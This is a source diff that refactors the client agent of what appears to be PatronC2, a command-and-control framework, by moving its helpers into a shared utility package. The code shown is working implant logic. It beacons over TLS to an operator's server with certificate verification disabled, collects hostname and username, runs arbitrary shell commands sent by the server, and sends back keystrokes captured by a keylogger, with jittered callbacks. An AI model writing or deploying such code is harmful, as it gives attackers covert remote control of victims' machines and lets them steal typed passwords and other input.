@@ -2,24 +2,15 @@ package main
 
 import (
 	"crypto/tls"
-	"crypto/x509"
-	"encoding/base64"
 	"encoding/gob"
 	"fmt"
 	"log"
-	"math/rand"
-	"net"
-	"os/exec"
-	"strconv"
-	"strings"
 	"time"
-
-	"github.com/google/uuid"
 
 	"github.com/MarinX/keylogger"
 	"github.com/PatronC2/Patron/types"
 	"github.com/PatronC2/Patron/lib/logger"
-	"github.com/PatronC2/Patron/lib/common"
+	"github.com/PatronC2/Patron/client/client_utils"
 )
 
 var (
@@ -32,8 +23,8 @@ var (
 )
 
 func main() {
-	initialize()
-	config, err := loadCertificate()
+	client_utils.Initialize()
+	config, err := client_utils.LoadCertificate(RootCert)
 	if err != nil {
 		log.Fatalf("Failed to load certificate: %v\n", err)
 	}
@@ -63,88 +54,42 @@ func main() {
 		}
 	}()
 
-	agentID, hostname, username := generateAgentMetadata()
+	agentID, hostname, username := client_utils.GenerateAgentMetadata()
 	logger.Logf(logger.Info, "Created AgentID: %v. Hostname: %v. Username: %v", agentID, hostname, username)
 
 	for {
-		beacon, encoder, decoder, err := establishConnection(config)
+		beacon, encoder, decoder, err := client_utils.EstablishConnection(config, ServerIP, ServerPort)
 		if err != nil {
 			time.Sleep(5 * time.Second)
 			continue
 		}
 		logger.Logf(logger.Info, "Beacon connected")
 
-		ip := getLocalIP(beacon)
+		ip := client_utils.GetLocalIP(beacon)
 		if err := handleConfigurationRequest(beacon, encoder, decoder, agentID, hostname, username, ip); err != nil {
-			handleError(beacon, "configuration", err)
+			client_utils.HandleError(beacon, "configuration", err)
 			continue
 		}
 
 		if err := handleCommandRequest(beacon, encoder, decoder, agentID); err != nil {
-			handleError(beacon, "command", err)
+			client_utils.HandleError(beacon, "command", err)
 			continue
 		}
 
 		if err := handleKeysRequest(beacon, encoder, decoder, agentID); err != nil {
-			handleError(beacon, "keylogs", err)
+			client_utils.HandleError(beacon, "keylogs", err)
 			continue
 		}
 
 		beacon.Close()
 		logger.Logf(logger.Info, "Beacon successful")
-		time.Sleep(time.Second * time.Duration(calculateSleepInterval()))
+		time.Sleep(time.Second * time.Duration(client_utils.CalculateSleepInterval(CallbackFrequency, CallbackJitter)))
 	}
-}
-
-func initialize() {
-	logger.EnableLogging(true)
-	if err := logger.SetLogFile("app.log"); err != nil {
-		fmt.Printf("Error setting log file: %v\n", err)
-	}
-	common.RegisterGobTypes()
-}
-
-func loadCertificate() (*tls.Config, error) {
-	publicKey, err := base64.StdEncoding.DecodeString(RootCert)
-	if err != nil {
-		return nil, err
-	}
-	roots := x509.NewCertPool()
-	if !roots.AppendCertsFromPEM(publicKey) {
-		return nil, fmt.Errorf("failed to parse root certificate")
-	}
-	return &tls.Config{RootCAs: roots, InsecureSkipVerify: true}, nil
-}
-
-func generateAgentMetadata() (string, string, string) {
-	agentID := uuid.New().String()
-	hostname, username := executeCommand("hostname -f"), executeCommand("whoami")
-	if hostname == "" { hostname = "unknown-host" }
-	if username == "" { username = "unknown-user" }
-	return agentID, hostname, username
-}
-
-func executeCommand(command string) string {
-	output, _ := exec.Command("bash", "-c", command).Output()
-	return strings.TrimSpace(string(output))
-}
-
-func establishConnection(config *tls.Config) (*tls.Conn, *gob.Encoder, *gob.Decoder, error) {
-	beacon, err := tls.Dial("tcp", fmt.Sprintf("%s:%s", ServerIP, ServerPort), config)
-	if err != nil {
-		logger.Logf(logger.Error, "Error occurred while connecting: %v", err)
-		return nil, nil, nil, err
-	}
-	return beacon, gob.NewEncoder(beacon), gob.NewDecoder(beacon), nil
-}
-
-func getLocalIP(beacon *tls.Conn) string {
-	return beacon.LocalAddr().(*net.TCPAddr).IP.String()
 }
 
 func handleConfigurationRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID, hostname, username, ip string) error {
 	configReq := createConfigurationRequest(agentID, hostname, username, ip)
-	if err := sendRequest(encoder, types.ConfigurationRequestType, configReq); err != nil {
+	if err := client_utils.SendRequest(encoder, types.ConfigurationRequestType, configReq); err != nil {
 		return err
 	}
 
@@ -197,7 +142,7 @@ func handleCommandRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.D
 	logger.Logf(logger.Info, "Fetching commands to run")
 
 	for {
-		if err := sendRequest(encoder, types.CommandRequestType, types.CommandRequest{AgentID: agentID}); err != nil {
+		if err := client_utils.SendRequest(encoder, types.CommandRequestType, types.CommandRequest{AgentID: agentID}); err != nil {
 			return err
 		}
 		var response types.Response
@@ -235,7 +180,7 @@ Exit:
 
 func executeAndReportCommand(beacon *tls.Conn, encoder *gob.Encoder, instruct types.CommandResponse) types.CommandStatusRequest {
 	commandResult := executeCommandRequest(&instruct)
-	sendRequest(encoder, types.CommandStatusRequestType, commandResult)
+	client_utils.SendRequest(encoder, types.CommandStatusRequestType, commandResult)
 	return commandResult
 }
 
@@ -248,7 +193,7 @@ func executeCommandRequest(instruct *types.CommandResponse) types.CommandStatusR
 	var CmdOut, result string
 	switch instruct.CommandType {
 	case "shell":
-		CmdOut, result = runShellCommand(instruct.Command), "1"
+		CmdOut, result = client_utils.RunShellCommand(instruct.Command), "1"
 	case "kill":
 		CmdOut, result = "~Killed~", "1"
 	default:
@@ -263,37 +208,6 @@ func executeCommandRequest(instruct *types.CommandResponse) types.CommandStatusR
 	}
 }
 
-func runShellCommand(command string) string {
-	cmd := exec.Command("bash", "-c", command)
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		logger.Logf(logger.Error, "Error running command: %v", command)
-		return err.Error()
-	}
-	logger.Logf(logger.Done, "Ran command: %v", command)
-	return string(output)
-}
-
-func calculateSleepInterval() float64 {
-	rand.Seed(time.Now().UnixNano())
-	frequency, _ := strconv.Atoi(CallbackFrequency)
-	jitter, _ := strconv.Atoi(CallbackJitter)
-	jitterPercent := float64(jitter) * 0.01
-	baseTime := float64(frequency)
-	variance := baseTime * jitterPercent * rand.Float64()
-	return baseTime - (jitterPercent * baseTime) + 2*variance
-}
-
-func sendRequest(encoder *gob.Encoder, reqType types.RequestType, payload interface{}) error {
-	return encoder.Encode(types.Request{Type: reqType, Payload: payload})
-}
-
-func handleError(beacon *tls.Conn, reqType string, err error) {
-	logger.Logf(logger.Error, "Error during %s request: %v", reqType, err)
-	beacon.Close()
-	time.Sleep(2 * time.Second)
-}
-
 func handleKeysRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID string) error {
 	logger.Logf(logger.Info, "Sending keylogs: %v", cache)
 	keyResponse := types.KeysRequest{
@@ -301,7 +215,7 @@ func handleKeysRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Deco
 		Keys: cache,
 	}
 
-	if err := sendRequest(encoder, types.KeysRequestType, keyResponse); err != nil {
+	if err := client_utils.SendRequest(encoder, types.KeysRequestType, keyResponse); err != nil {
 		return err
 	}
 	var response types.Response
